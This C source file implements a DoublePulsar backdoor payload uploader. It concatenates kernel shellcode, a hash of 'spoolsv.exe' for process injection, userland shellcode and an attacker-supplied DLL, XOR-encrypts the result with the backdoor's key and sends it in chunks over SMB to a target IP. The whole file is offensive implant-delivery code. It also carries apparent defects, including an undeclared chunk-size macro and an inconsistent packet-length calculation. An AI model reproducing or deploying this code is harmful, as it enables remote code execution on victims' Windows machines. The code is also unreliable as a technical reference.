#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <ctype.h>
#include <dirent.h>
#include <poll.h>
#include <pthread.h>
#include <math.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pwd.h>
#include <grp.h>
#include <utime.h>
#include <syslog.h>
#include <wchar.h>
#include <errno.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

extern const unsigned char KERNEL_SHELLCODE_X64_PART1[];
extern const size_t KERNEL_SHELLCODE_X64_PART1_LEN;
extern const unsigned char KERNEL_SHELLCODE_X64_PART2[];
extern const size_t KERNEL_SHELLCODE_X64_PART2_LEN;
extern const unsigned char USERLAND_SHELLCODE_X64[];
extern const size_t USERLAND_SHELLCODE_X64_LEN;
extern const unsigned char DP_EXEC_PKT[];
extern const size_t DP_EXEC_PKT_LEN;
extern const size_t DP_EXEC_DATA_OFFSET;
extern const size_t DP_EXEC_SIGNATURE_OFFSET;
extern uint32_t DoublePulsarXORKeyCalculator(uint32_t signature);
extern void xor_buffer(unsigned char *buffer, size_t length, uint32_t key);
extern int smb_send(const char *ip, int port, const unsigned char *packet, size_t packet_len);

#ifndef SMB_CHUNK_SIZE
#error SMB_CHUNK_SIZE must be defined
#endif

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    FILE *file;
    unsigned char *dll = NULL;
    unsigned char *payload = NULL;
    unsigned char *packet = NULL;
    long file_size;
    size_t dll_size;
    size_t payload_size;
    size_t offset;
    size_t chunk;
    size_t packet_size;
    uint32_t signature;
    uint32_t xor_key;
    uint32_t process_hash = 0;
    static const char process_name[] = "spoolsv.exe";
    size_t i;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port <= 0)
        return -1;

    file = fopen(payload_path, "rb");
    if (file == NULL)
        return -1;

    if (fseek(file, 0, SEEK_END) != 0) {
        fclose(file);
        return -1;
    }
    file_size = ftell(file);
    if (file_size < 0 || fseek(file, 0, SEEK_SET) != 0) {
        fclose(file);
        return -1;
    }

    dll_size = (size_t)file_size;
    dll = malloc(dll_size == 0 ? 1 : dll_size);
    if (dll == NULL) {
        fclose(file);
        return -1;
    }
    if (dll_size != 0 && fread(dll, 1, dll_size, file) != dll_size) {
        free(dll);
        fclose(file);
        return -1;
    }
    if (fclose(file) != 0) {
        free(dll);
        return -1;
    }

    for (i = 0; i < sizeof(process_name) - 1; ++i) {
        unsigned char c = (unsigned char)process_name[i];
        if (c >= 'a' && c <= 'z')
            c = (unsigned char)(c - ('a' - 'A'));
        process_hash = (process_hash >> 13) | (process_hash << 19);
        process_hash += c;
    }

    if (KERNEL_SHELLCODE_X64_PART1_LEN > SIZE_MAX - sizeof(process_hash) ||
        KERNEL_SHELLCODE_X64_PART1_LEN + sizeof(process_hash) >
            SIZE_MAX - KERNEL_SHELLCODE_X64_PART2_LEN ||
        KERNEL_SHELLCODE_X64_PART1_LEN + sizeof(process_hash) +
            KERNEL_SHELLCODE_X64_PART2_LEN > SIZE_MAX - USERLAND_SHELLCODE_X64_LEN ||
        KERNEL_SHELLCODE_X64_PART1_LEN + sizeof(process_hash) +
            KERNEL_SHELLCODE_X64_PART2_LEN + USERLAND_SHELLCODE_X64_LEN >
            SIZE_MAX - dll_size) {
        free(dll);
        return -1;
    }

    payload_size = KERNEL_SHELLCODE_X64_PART1_LEN + sizeof(process_hash) +
                   KERNEL_SHELLCODE_X64_PART2_LEN + USERLAND_SHELLCODE_X64_LEN +
                   dll_size;
    payload = malloc(payload_size == 0 ? 1 : payload_size);
    if (payload == NULL) {
        free(dll);
        return -1;
    }

    offset = 0;
    memcpy(payload + offset, KERNEL_SHELLCODE_X64_PART1,
           KERNEL_SHELLCODE_X64_PART1_LEN);
    offset += KERNEL_SHELLCODE_X64_PART1_LEN;
    memcpy(payload + offset, &process_hash, sizeof(process_hash));
    offset += sizeof(process_hash);
    memcpy(payload + offset, KERNEL_SHELLCODE_X64_PART2,
           KERNEL_SHELLCODE_X64_PART2_LEN);
    offset += KERNEL_SHELLCODE_X64_PART2_LEN;
    memcpy(payload + offset, USERLAND_SHELLCODE_X64, USERLAND_SHELLCODE_X64_LEN);
    offset += USERLAND_SHELLCODE_X64_LEN;
    if (dll_size != 0)
        memcpy(payload + offset, dll, dll_size);
    free(dll);

    if (DP_EXEC_SIGNATURE_OFFSET > DP_EXEC_PKT_LEN ||
        sizeof(signature) > DP_EXEC_PKT_LEN - DP_EXEC_SIGNATURE_OFFSET ||
        DP_EXEC_DATA_OFFSET > DP_EXEC_PKT_LEN ||
        DP_EXEC_CHUNK_SIZE > SIZE_MAX - DP_EXEC_PKT_LEN) {
        free(payload);
        return -1;
    }

    memcpy(&signature, DP_EXEC_PKT + DP_EXEC_SIGNATURE_OFFSET, sizeof(signature));
    xor_key = DoublePulsarXORKeyCalculator(signature);
    xor_buffer(payload, payload_size, xor_key);

    packet_size = DP_EXEC_PKT_LEN + (size_t)SMB_CHUNK_SIZE;
    packet = malloc(packet_size);
    if (packet == NULL) {
        free(payload);
        return -1;
    }

    for (offset = 0; offset < payload_size; offset += chunk) {
        chunk = payload_size - offset;
        if (chunk > SMB_CHUNK_SIZE)
            chunk = SMB_CHUNK_SIZE;
        memcpy(packet, DP_EXEC_PKT, DP_EXEC_PKT_LEN);
        memcpy(packet + DP_EXEC_DATA_OFFSET, payload + offset, chunk);
        if (smb_send(ip, port, packet, DP_EXEC_PKT_LEN + chunk) != 0) {
            free(packet);
            free(payload);
            return -1;
        }
    }

    free(packet);
    free(payload);
    return 0;
}